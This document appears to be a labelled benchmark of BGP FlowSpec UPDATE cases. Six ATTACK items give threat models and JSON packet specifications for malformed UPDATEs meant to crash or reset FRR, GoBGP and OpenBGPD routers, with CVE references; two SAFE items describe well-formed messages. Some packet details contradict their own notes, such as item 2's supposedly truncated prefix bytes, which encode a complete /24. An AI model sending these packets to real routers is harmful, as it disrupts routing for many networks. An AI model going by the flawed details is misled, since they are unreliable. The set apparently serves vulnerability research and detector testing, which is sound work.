## 1) FLOWSPEC-UPDATE - nlri-length-zero
**Message:** FLOWSPEC-UPDATE
**Target Attribute's path:** nlri-length-zero
**Threat Model:**
- **Attack Assumption:**
In the target network, a BGP speaker runs FRRouting (FRR) before version 8.4.3 with BGP FlowSpec enabled (AFI 1, SAFI 133). The FRR bgpd FlowSpec NLRI parser in bgpd/bgp_flowspec.c uses the NLRI length field to bound its parsing loop. RFC 8955 Section 4 requires that a FlowSpec NLRI have a length greater than zero, but the FRR implementation does not validate this constraint before entering the parsing loop.
We assume: (i) the attacker has established a BGP session (eBGP or iBGP) with the target FRR router; (ii) the target router has FlowSpec address family activated; and (iii) the target router runs FRR < 8.4.3 (before the fix in PR #12884).
- **Attacker Capability:**
The attacker can send arbitrary BGP UPDATE messages on an established BGP session.

**Attack Procedure:**
The attacker sends a BGP UPDATE message containing an MP_REACH_NLRI attribute with AFI=1, SAFI=133 (IPv4 FlowSpec). The FlowSpec NLRI portion has its length field set to 0. Per RFC 8955 Section 4, a valid FlowSpec NLRI must encode at least one Flow Specification component, so a length of 0 is explicitly invalid. However, FRR's bgp_flowspec.c does not check for this condition. The parsing function uses the NLRI length as an unsigned loop bound; when length=0, the unsigned subtraction underflows, causing the parser to read far beyond the allocated buffer. This triggers a buffer over-read that crashes bgpd (segmentation fault) or potentially allows information disclosure from adjacent memory. The crash causes the BGP session to drop and all routes learned from this router to be withdrawn, disrupting routing for all prefixes served by this router. The PoC is successful if the target FRR bgpd process crashes upon receiving this UPDATE. This vulnerability is tracked as CVE-2023-38406 (CVSS 9.8 CRITICAL).

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "bgp_header": {
    "marker": "ffffffffffffffffffffffffffffffff",
    "type": 2,
    "length": 50
  },
  "withdrawn_routes_length": 0,
  "withdrawn_routes": [],
  "path_attributes": [
    {
      "attr_flags": "0x40",
      "attr_type": 1,
      "attr_name": "ORIGIN",
      "attr_value": 0
    },
    {
      "attr_flags": "0x40",
      "attr_type": 2,
      "attr_name": "AS_PATH",
      "attr_value": [
        {
          "segment_type": "AS_SEQUENCE",
          "segment_value": [666]
        }
      ]
    },
    {
      "attr_flags": "0xc0",
      "attr_type": 14,
      "attr_name": "MP_REACH_NLRI",
      "attr_value": {
        "afi": 1,
        "safi": 133,
        "next_hop": "198.51.100.1",
        "nlri": [
          {
            "raw_length": 0,
            "flowspec_rules": []
          }
        ]
      }
    }
  ],
  "nlri": []
}

**Classification:**
ATTACK


## 2) FLOWSPEC-UPDATE - flowspec-nlri-truncated-component
**Message:** FLOWSPEC-UPDATE
**Target Attribute's path:** flowspec-nlri-truncated-component
**Threat Model:**
- **Attack Assumption:**
In the target network, a BGP speaker runs GoBGP before version 3.35.0 with BGP FlowSpec enabled. The GoBGP FlowSpec parser in pkg/packet/bgp/bgp.go deserializes FlowSpec NLRI components by reading type-length-value fields sequentially. RFC 8955 Section 4 defines the minimum encoding for each Flow Specification component type (e.g., Type 1 destination prefix requires at least a prefix-length byte and the prefix value). However, GoBGP does not validate that the remaining bytes in the NLRI are sufficient to decode the declared component type before attempting to read them.
We assume: (i) the attacker has established a BGP session with the target GoBGP router; (ii) the target router has FlowSpec address family activated; and (iii) the target router runs GoBGP < 3.35.0 (before the fix in commit ca7383f).
- **Attacker Capability:**
The attacker can send arbitrary BGP UPDATE messages on an established BGP session.

**Attack Procedure:**
The attacker sends a BGP UPDATE message containing an MP_REACH_NLRI attribute with AFI=1, SAFI=133. The FlowSpec NLRI declares a total length of 5 bytes but encodes a destination prefix component (Type 1) that would require more bytes than available -- specifically, the NLRI claims a /24 prefix (requiring 3 prefix bytes + 1 length byte + 1 type byte = 5 bytes minimum) but only provides 3 bytes of actual data after the type and length fields. When GoBGP's FlowSpec parser attempts to read the prefix value, it performs an array slice operation that exceeds the underlying buffer length, triggering a Go runtime panic ("index out of range"). The panic is unrecovered, causing the entire gobgpd process to crash. Per RFC 7606 Section 2, a BGP implementation receiving a malformed UPDATE should use "treat-as-withdraw" semantics and keep the session established, but GoBGP terminates the process instead. The PoC is successful if the target gobgpd process panics upon receiving this UPDATE. This vulnerability is tracked as CVE-2025-43972 (CVSS 7.5 HIGH).

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "bgp_header": {
    "marker": "ffffffffffffffffffffffffffffffff",
    "type": 2,
    "length": 52
  },
  "withdrawn_routes_length": 0,
  "withdrawn_routes": [],
  "path_attributes": [
    {
      "attr_flags": "0x40",
      "attr_type": 1,
      "attr_name": "ORIGIN",
      "attr_value": 0
    },
    {
      "attr_flags": "0x40",
      "attr_type": 2,
      "attr_name": "AS_PATH",
      "attr_value": [
        {
          "segment_type": "AS_SEQUENCE",
          "segment_value": [666]
        }
      ]
    },
    {
      "attr_flags": "0xc0",
      "attr_type": 14,
      "attr_name": "MP_REACH_NLRI",
      "attr_value": {
        "afi": 1,
        "safi": 133,
        "next_hop": "198.51.100.1",
        "nlri": [
          {
            "raw_length": 5,
            "flowspec_rules": [
              {"type": 1, "name": "destination_prefix", "value": "TRUNCATED", "raw_bytes": "01 18 08 08 08", "note": "declares /24 prefix but only 3 bytes of prefix data provided, missing final byte"}
            ]
          }
        ]
      }
    }
  ],
  "nlri": []
}

**Classification:**
ATTACK


## 3) FLOWSPEC-UPDATE - nlri-length-overflow-255
**Message:** FLOWSPEC-UPDATE
**Target Attribute's path:** nlri-length-overflow-255
**Threat Model:**
- **Attack Assumption:**
In the target network, a BGP speaker runs FRRouting with BGP FlowSpec enabled. RFC 8955 Section 4 specifies that the FlowSpec NLRI length is encoded as 1 byte if the value is < 240, or as 2 bytes (0xf0 prefix + 2-byte length) if >= 240. FRR's FlowSpec parser reads the first byte of the NLRI length field; if the value is >= 0xf0, it reads two additional bytes for the extended length. However, the parser does not validate that the declared NLRI length is consistent with the actual number of remaining bytes in the MP_REACH_NLRI attribute. When the declared length exceeds the attribute's remaining data, the parser reads beyond the attribute boundary into adjacent memory.
We assume: (i) the attacker has established a BGP session with the target FRR router; (ii) FlowSpec is activated; and (iii) the target runs a vulnerable FRR version.
- **Attacker Capability:**
The attacker can send arbitrary BGP UPDATE messages on an established BGP session.

**Attack Procedure:**
The attacker sends a BGP UPDATE with an MP_REACH_NLRI attribute (AFI=1, SAFI=133) where the FlowSpec NLRI length field is set to 255 (0xff as a single byte, which per RFC 8955 encoding should trigger the extended 2-byte length path, but the attacker uses the raw value 0xff without the extended encoding prefix). The actual NLRI data following the length byte contains only 10 bytes of valid FlowSpec component data. The parser interprets 0xff as length=255 and attempts to parse 255 bytes of FlowSpec components, reading 245 bytes beyond the actual NLRI data. This causes an out-of-bounds read that either crashes bgpd with a segmentation fault or leaks contents of adjacent heap memory into the parsed FlowSpec structure. The PoC is successful if the target bgpd process crashes or exhibits anomalous behavior upon receiving this UPDATE.

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "bgp_header": {
    "marker": "ffffffffffffffffffffffffffffffff",
    "type": 2,
    "length": 62
  },
  "withdrawn_routes_length": 0,
  "withdrawn_routes": [],
  "path_attributes": [
    {
      "attr_flags": "0x40",
      "attr_type": 1,
      "attr_name": "ORIGIN",
      "attr_value": 0
    },
    {
      "attr_flags": "0x40",
      "attr_type": 2,
      "attr_name": "AS_PATH",
      "attr_value": [
        {
          "segment_type": "AS_SEQUENCE",
          "segment_value": [666]
        }
      ]
    },
    {
      "attr_flags": "0xc0",
      "attr_type": 14,
      "attr_name": "MP_REACH_NLRI",
      "attr_value": {
        "afi": 1,
        "safi": 133,
        "next_hop": "198.51.100.1",
        "nlri": [
          {
            "raw_length": 255,
            "raw_length_note": "declares 255 bytes but only 10 bytes of actual NLRI data follow",
            "flowspec_rules": [
              {"type": 1, "name": "destination_prefix", "value": "203.0.113.0/24"},
              {"type": 3, "name": "ip_protocol", "value": [{"op": "==", "value": 6}]}
            ]
          }
        ]
      }
    }
  ],
  "nlri": []
}

**Classification:**
ATTACK


## 4) FLOWSPEC-UPDATE - next-hop-length-invalid
**Message:** FLOWSPEC-UPDATE
**Target Attribute's path:** next-hop-length-invalid
**Threat Model:**
- **Attack Assumption:**
In the target network, a BGP speaker runs GoBGP v4.2.0 or earlier. RFC 4271 Section 5.1.3 specifies that the NEXT_HOP path attribute for IPv4 unicast MUST be exactly 4 octets. RFC 7606 Section 2 requires that a BGP implementation receiving a malformed UPDATE attribute should apply "treat-as-withdraw" semantics -- i.e., treat the UPDATE as though it were a withdrawal of the contained routes, without tearing down the BGP session. However, GoBGP's ValidateAttribute function in pkg/packet/bgp/bgp.go constructs a PathAttributeNextHop object from the raw bytes without first checking that AttrLen >= 4. When AttrLen < 4, the subsequent access to the parsed NextHop value triggers an array index out-of-range panic.
We assume: (i) the attacker has established a BGP session with the target GoBGP router; (ii) the target runs GoBGP <= v4.2.0 (before the fix for CVE-2026-30405).
- **Attacker Capability:**
The attacker can send arbitrary BGP UPDATE messages on an established BGP session.

**Attack Procedure:**
The attacker sends a BGP UPDATE message containing a NEXT_HOP path attribute (type code 3) with AttrLen set to 0 (zero bytes of NEXT_HOP data). The UPDATE also contains a valid ORIGIN and AS_PATH, and announces a prefix in the NLRI field. When GoBGP parses this UPDATE, it successfully reads the NEXT_HOP attribute header (flags + type + length) and constructs a PathAttributeNextHop with an empty value. Later, ValidateAttribute attempts to access the NextHop IP address (a 4-byte field) from the zero-length buffer, causing a runtime panic: "index out of range [0] with length 0". The panic is unrecovered, crashing the entire gobgpd process. This violates RFC 7606 which mandates that malformed attributes be handled gracefully. The crash drops all BGP sessions on the router, withdrawing all routes and causing a routing disruption for all peers. The PoC is successful if the target gobgpd process panics upon receiving this UPDATE. This vulnerability is tracked as CVE-2026-30405 (CVSS 8.7 HIGH).

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "bgp_header": {
    "marker": "ffffffffffffffffffffffffffffffff",
    "type": 2,
    "length": 55
  },
  "withdrawn_routes_length": 0,
  "withdrawn_routes": [],
  "path_attributes": [
    {
      "attr_flags": "0x40",
      "attr_type": 1,
      "attr_name": "ORIGIN",
      "attr_value": 0
    },
    {
      "attr_flags": "0x40",
      "attr_type": 2,
      "attr_name": "AS_PATH",
      "attr_value": [
        {
          "segment_type": "AS_SEQUENCE",
          "segment_value": [666]
        }
      ]
    },
    {
      "attr_flags": "0x40",
      "attr_type": 3,
      "attr_name": "NEXT_HOP",
      "attr_value": "",
      "attr_length": 0,
      "attr_length_note": "RFC 4271 requires exactly 4 bytes; 0 bytes triggers index-out-of-range panic in GoBGP ValidateAttribute"
    }
  ],
  "nlri": ["203.0.113.0/24"]
}

**Classification:**
ATTACK


## 5) FLOWSPEC-UPDATE - eor-malformed-no-withdraw
**Message:** FLOWSPEC-UPDATE
**Target Attribute's path:** eor-malformed-no-withdraw
**Threat Model:**
- **Attack Assumption:**
In the target network, a BGP speaker runs FRRouting <= 9.0.1 with BGP FlowSpec enabled. RFC 4724 Section 2 defines the End-of-RIB (EOR) marker as a BGP UPDATE with no reachable NLRI and empty withdrawn routes. RFC 7606 Section 2 requires that when a malformed UPDATE is received, the implementation MUST use "treat-as-withdraw" semantics -- treating the UPDATE as a withdrawal rather than resetting the session. However, FRR's UPDATE processing logic has a code path where the presence of an EOR marker in a malformed UPDATE bypasses the treat-as-withdraw handling, causing bgpd to crash instead of gracefully withdrawing the routes.
We assume: (i) the attacker has established a BGP session with the target FRR router; (ii) the target runs FRR <= 9.0.1 (before the fix for CVE-2023-47235).
- **Attacker Capability:**
The attacker can send arbitrary BGP UPDATE messages on an established BGP session.

**Attack Procedure:**
The attacker sends a BGP UPDATE message that is simultaneously an EOR marker (no NLRI, no withdrawn routes) and contains a malformed path attribute -- specifically, an MP_REACH_NLRI attribute with AFI=1, SAFI=133 (FlowSpec) where the attribute length is inconsistent with the encoded content (e.g., the attribute header declares 20 bytes but only 5 bytes of data follow). When FRR receives this UPDATE, the EOR detection logic fires first and sets internal flags indicating "this is an EOR." Subsequently, the attribute parsing detects the malformation, but because the EOR flag is already set, the code takes a different branch that does not invoke the treat-as-withdraw handler. Instead, it hits an assertion failure or null pointer dereference in the EOR processing path, crashing bgpd. The PoC is successful if the target FRR bgpd process crashes upon receiving this malformed EOR UPDATE. This vulnerability is tracked as CVE-2023-47235 (CVSS 6.8 MEDIUM).

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "bgp_header": {
    "marker": "ffffffffffffffffffffffffffffffff",
    "type": 2,
    "length": 48
  },
  "withdrawn_routes_length": 0,
  "withdrawn_routes": [],
  "path_attributes": [
    {
      "attr_flags": "0x40",
      "attr_type": 1,
      "attr_name": "ORIGIN",
      "attr_value": 0
    },
    {
      "attr_flags": "0x40",
      "attr_type": 2,
      "attr_name": "AS_PATH",
      "attr_value": [
        {
          "segment_type": "AS_SEQUENCE",
          "segment_value": [666]
        }
      ]
    },
    {
      "attr_flags": "0xc0",
      "attr_type": 14,
      "attr_name": "MP_REACH_NLRI",
      "attr_value": {
        "afi": 1,
        "safi": 133,
        "next_hop": "198.51.100.1",
        "nlri": [],
        "attr_length_declared": 20,
        "attr_length_actual": 5,
        "note": "EOR-like UPDATE (empty NLRI) with inconsistent MP_REACH_NLRI attribute length; triggers crash because EOR detection bypasses treat-as-withdraw"
      }
    }
  ],
  "nlri": []
}

**Classification:**
ATTACK


## 6) FLOWSPEC-UPDATE - path-attr-length-mismatch
**Message:** FLOWSPEC-UPDATE
**Target Attribute's path:** path-attr-length-mismatch
**Threat Model:**
- **Attack Assumption:**
In the target network, a BGP speaker runs OpenBGPD before version 8.1. RFC 4271 Section 4.3 specifies that each path attribute in a BGP UPDATE has a length field that indicates the number of bytes of attribute data following the attribute header. RFC 7606 requires that length inconsistencies be handled gracefully (treat-as-withdraw or attribute-discard). However, OpenBGPD's UPDATE parser does not properly validate that the declared path attribute length is consistent with the total path attributes length field in the UPDATE header. When a path attribute declares a length that extends beyond the total path attributes section, OpenBGPD incorrectly resets the BGP session instead of applying treat-as-withdraw semantics.
We assume: (i) the attacker has established a BGP session with the target OpenBGPD router; (ii) the target runs OpenBGPD < 8.1 (before the fix for CVE-2023-38283).
- **Attacker Capability:**
The attacker can send arbitrary BGP UPDATE messages on an established BGP session.

**Attack Procedure:**
The attacker sends a BGP UPDATE message where the total path attributes length field in the UPDATE header is set to 30 bytes, but the first path attribute (ORIGIN) declares an attribute length of 50 bytes -- exceeding the total path attributes section by 20 bytes. RFC 4271 Section 6.3 specifies that this condition should generate an UPDATE message error, and RFC 7606 further refines this to treat-as-withdraw semantics for most attribute errors. However, OpenBGPD's parser detects the length inconsistency and immediately sends a NOTIFICATION (error code 3, subcode 1: Malformed Attribute List) and tears down the BGP session. While sending a NOTIFICATION is technically permitted by RFC 4271, RFC 7606 Section 2 explicitly recommends against session reset for attribute length errors because it causes collateral damage -- all routes learned from the peer are withdrawn, not just the malformed one. The attacker can repeatedly send such malformed UPDATEs to keep the session in a connect-reset loop, effectively denying all routing service through this peer. The PoC is successful if the target OpenBGPD router resets the BGP session upon receiving this UPDATE. This vulnerability is tracked as CVE-2023-38283 (CVSS 5.3 MEDIUM).

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "bgp_header": {
    "marker": "ffffffffffffffffffffffffffffffff",
    "type": 2,
    "length": 53
  },
  "withdrawn_routes_length": 0,
  "withdrawn_routes": [],
  "total_path_attributes_length": 30,
  "total_path_attributes_length_note": "header declares 30 bytes for all path attributes combined",
  "path_attributes": [
    {
      "attr_flags": "0x40",
      "attr_type": 1,
      "attr_name": "ORIGIN",
      "attr_value": 0,
      "attr_length": 50,
      "attr_length_note": "declares 50 bytes but total path attributes section is only 30 bytes; OpenBGPD resets session instead of treat-as-withdraw"
    }
  ],
  "nlri": []
}

**Classification:**
ATTACK


## 7) FLOWSPEC-UPDATE - valid-flowspec-discard-own-prefix
**Message:** FLOWSPEC-UPDATE
**Target Attribute's path:** valid-flowspec-discard-own-prefix
**Threat Model:**
- **Attack Assumption:**
In the target network, a BGP speaker runs FRRouting 9.1 with BGP FlowSpec enabled. The operator sends a well-formed FlowSpec UPDATE to its upstream transit provider to request rate-limiting of DDoS traffic targeting its own prefix 198.51.100.0/24.
We assume: (i) the operator has an established eBGP session with the transit provider; (ii) the FlowSpec NLRI is correctly encoded per RFC 8955 Section 4 with valid length fields and properly formatted Flow Specification components; (iii) all path attributes (ORIGIN, AS_PATH, MP_REACH_NLRI, EXTENDED_COMMUNITIES) have correct and consistent length fields; and (iv) the transit provider enforces the feasibility check per RFC 8955 Section 6.
- **Attacker Capability:**
The operator sends BGP FlowSpec UPDATE messages on an established eBGP session.
**Security Analysis:**
This is a well-formed FlowSpec UPDATE with all fields correctly encoded per their respective RFCs. The NLRI length field accurately reflects the number of bytes in the FlowSpec NLRI. The path attribute lengths are consistent with their contents. The NEXT_HOP is a valid 4-byte IPv4 address. The traffic-rate extended community uses proper IEEE 754 float encoding. No implementation parser will crash, panic, or exhibit anomalous behavior when processing this UPDATE because all length fields, type codes, and encodings conform to the standards. The FlowSpec action (rate-limit to 10 Mbps) targets the operator's own prefix, which passes the feasibility check. This represents normal, correct FlowSpec operation that all compliant implementations handle without error.

**Classification:**
SAFE


## 8) FLOWSPEC-UPDATE - valid-update-standard-attributes
**Message:** FLOWSPEC-UPDATE
**Target Attribute's path:** valid-update-standard-attributes
**Threat Model:**
- **Attack Assumption:**
In the target network, a BGP speaker runs GoBGP 3.35.0 (latest patched version). A legitimate peer sends a standard BGP UPDATE message with correctly encoded path attributes including ORIGIN (1 byte), AS_PATH (variable, correctly length-encoded), NEXT_HOP (exactly 4 bytes), and MP_REACH_NLRI with a valid FlowSpec NLRI containing a destination prefix component and a protocol component.
We assume: (i) the peer has an established BGP session; (ii) all attribute lengths match their actual content; and (iii) the FlowSpec NLRI length correctly reflects the encoded components.
- **Attacker Capability:**
The peer sends BGP UPDATE messages on an established BGP session.
**Security Analysis:**
This UPDATE message is fully compliant with RFC 4271 (BGP-4), RFC 4760 (Multiprotocol Extensions), and RFC 8955 (FlowSpec). Every path attribute has a length field that exactly matches the number of data bytes that follow. The NEXT_HOP attribute is exactly 4 bytes as required by RFC 4271 Section 5.1.3. The FlowSpec NLRI length field correctly encodes the total size of the Flow Specification components. Each Flow Specification component (destination prefix Type 1, IP protocol Type 3) is encoded with the correct number of bytes for its declared values. No parser in any compliant implementation (FRR, GoBGP, BIRD, OpenBGPD) will encounter a length mismatch, buffer over-read, or unexpected end-of-data condition. The UPDATE will be parsed successfully, the FlowSpec route will be installed in the Adj-RIB-In, and normal FlowSpec processing will proceed. This represents correct protocol operation.

**Classification:**
SAFE
